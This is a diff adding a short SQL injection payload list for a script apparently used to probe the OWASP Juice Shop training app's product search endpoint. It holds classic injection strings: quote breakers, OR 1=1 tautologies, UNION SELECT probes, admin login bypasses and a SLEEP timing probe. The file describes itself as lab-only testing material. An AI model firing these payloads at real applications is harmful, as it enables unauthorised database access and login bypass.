@@ -1,0 +1,20 @@
+# SQLi payloads for juiceshop_sqli.py (one per line, # = comment).
+# These are fired at /rest/products/search?q= and counted as a HIT if they
+# trigger a SQLite/Sequelize error or a 5xx. Benign, lab-only.
+'
+"
+')
+'))
+' OR 1=1-- -
+')) OR 1=1-- -
+')) OR 1=2-- -
+' UNION SELECT NULL-- -
+')) UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+zzz'
+zzz')
+zzz'))
+zzz')) OR 1=1-- -
+admin'-- -
+admin' #
+' OR 'a'='a
+')) OR SLEEP(0)-- -
